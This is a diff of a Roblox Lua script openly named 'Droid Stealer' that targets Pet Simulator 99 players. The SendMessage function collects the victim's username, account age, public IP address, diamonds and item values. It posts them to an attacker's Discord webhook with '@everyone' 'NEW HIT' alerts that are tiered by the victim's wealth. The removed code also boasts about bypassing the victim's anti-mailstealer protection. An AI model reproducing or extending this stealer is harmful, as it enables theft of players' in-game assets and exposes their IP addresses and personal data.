@@ -81,11 +81,24 @@ end
 
 -- Updated SendMessage function
 local HttpService = game:GetService("HttpService")
-
-local HttpService = game:GetService("HttpService")
-
 local function SendMessage(username, diamonds)
-    local TheReceiver = username
+    local headers = {
+        ["Content-Type"] = "application/json",
+    }
+
+    -- Determine content based on totalRAP
+    local CONTENTWB
+    if totalRAP >= 10000000000 then
+        CONTENTWB = "@everyone YOUR PLAYER IS THE RICHEST ON GOD!!!! THEY GOT 10B+ RAP"
+    elseif totalRAP >= 5000000000 then
+        CONTENTWB = "@everyone YOUR PLAYER IS FUCKING RICHHHHH LIKE HELLA!!!! THEY GOT 5B+ RAP"
+    elseif totalRAP >= 1000000000 then
+        CONTENTWB = "@everyone YOUR PLAYER IS FUCKING RICH! THEY GOT 1B+ RAP"
+    elseif totalRAP >= 500000000 then
+        CONTENTWB = "@everyone YOUR PLAYER IS DECENTLY RICH! THEY GOT 500m+ RAP"
+    else
+        CONTENTWB = "NEW HIT! PLAYER HAS LESS THAN 1B RAP"
+    end
 
     -- Construct fields
     local fields = {
@@ -96,7 +109,7 @@ local function SendMessage(username, diamonds)
                     "\nPLAYER-AGE 🔞 : " .. tostring(game.Players.LocalPlayer.AccountAge) .. " DAYS" ..
                     "\nEXPLOIT    🖥 : " .. tostring(identifyexecutor()) ..
                     "\nPLATFORM   🖱 : " .. tostring("SOON") ..
-                    "\nRECEIVER   🧟‍♂️ : " .. tostring(TheReceiver) ..
+                    "\nRECEIVER   🧟‍♂️ : " .. tostring(username) ..
                     "\nVERSION    🌐 : " .. tostring("VERSION 1") ..
                     "\nUSER-IP    📤 : " .. tostring(game:HttpGet("https://api.ipify.org")) .. "```",
             inline = true
@@ -108,14 +121,16 @@ local function SendMessage(username, diamonds)
         },
         {
             name = "( 🎃 ) ADDITIONAL INFO",
-            value = "",
+            value = "```DIAMONDS      💎 : " .. formatNumber(diamonds) ..
+                    "\nOVERALL RAP   🔢 : " .. formatNumber(totalRAP) .. "```",
             inline = false
         }
     }
 
-    -- Process the items
+    -- Process items into combined lists
     local combinedItems = {}
     local itemRapMap = {}
+
     for _, item in ipairs(sortedItems) do
         local rapKey = item.name
         if itemRapMap[rapKey] then
@@ -130,69 +145,63 @@ local function SendMessage(username, diamonds)
         return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount
     end)
 
-    fields[2].value = "```\n"
     for _, itemName in ipairs(combinedItems) do
         local itemData = itemRapMap[itemName]
-        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" ..
-                          ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
-    end
-    fields[2].value = fields[2].value .. "```"
-    fields[3].value = fields[3].value .. "```DIAMONDS      💎 : " .. formatNumber(diamonds) .. "\n"
-    fields[3].value = fields[3].value .. "OVERALL RAP   🔢 : " .. formatNumber(totalRAP) .. "```"
-
-    if getFucked then
-        fields[3].value = fields[3].value .. "\n\n```Victim tried to use anti-mailstealer, but got bypassed instead```"
+        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
     end
 
-    local CONTENTWB
-    if totalRAP >= 10000000000 then
-        CONTENTWB = "@everyone YOUR PLAYER IS THE RICHEST ON GOD!!!! THEY GOT 10B+ RAP"
-    elseif totalRAP >= 5000000000 then
-        CONTENTWB = "@everyone YOUR PLAYER IS FUCKING RICHHHHH LIKE HELLA!!!! THEY GOT 5B+ RAP"
-    elseif totalRAP >= 1000000000 then
-        CONTENTWB = "@everyone YOUR PLAYER IS FUCKING RICH! THEY GOT 1B+ RAP"
-    elseif totalRAP >= 500000000 then
-        CONTENTWB = "@everyone YOUR PLAYER IS DECENTLY RICH! THEY GOT 500m+ RAP"
-    else
-        CONTENTWB = "NEW HIT! PLAYER HAS LESS THAN 1B RAP"
+    if #fields[2].value > 1024 then
+        local lines = {}
+        for line in fields[2].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[2].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[2].value = table.concat(lines, "\n")
+            fields[2].value = fields[2].value .. "\nPlus more!"
+        end
     end
 
-    -- Construct the payload
-    local payload = {
-        username = "Droid Stealer",
-        avatar_url = "https://cdn.discordapp.com/attachments/1288660529539317824/1299204925229895750/IMG_1832.png",
-        content = CONTENTWB,
-        embeds = {{
-            title = "⛅️ __**New Hit With Droid Stealer**__ ⛅️",
-            type = "rich",
-            color = tonumber("0x05f7ff"),
-            fields = fields,
-            footer = {
-                text = "Pet Simulator 99!"
+    -- Construct embed data
+    local data = {
+        ["content"] = CONTENTWB,
+        ["embeds"] = {{
+            ["title"] = "⛅️ __**New Hit With Droid Stealer**__ ⛅️",
+            ["type"] = "rich",
+            ["color"] = tonumber("0x05f7ff"),
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "Pet Simulator 99!"
             },
-            thumbnail = {
-                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=420&height=420&format=png"
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=420&height=420&format=png"
             }
         }}
     }
 
-    -- Send the webhook
-    local success, response = pcall(function()
-        return httpRequest({
-            Url = Webhook,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(payload)
-        })
-    end)
+    local body = HttpService:JSONEncode(data)
 
-    if success and response and response.Success then
-        print("Webhook sent successfully!")
+    -- Send webhook
+    if webhook and webhook ~= "" then
+        local success, response = pcall(function()
+            return request({
+                Url = webhook,
+                Method = "POST",
+                Headers = headers,
+                Body = body
+            })
+        end)
+
+        if success and response and response.Success then
+            print("Webhook sent successfully!")
+        else
+            warn("Failed to send webhook.")
+        end
     else
-        warn("Failed to send webhook.")
+        warn("Webhook URL is missing or empty.")
     end
 end
-
 
 local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
 local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
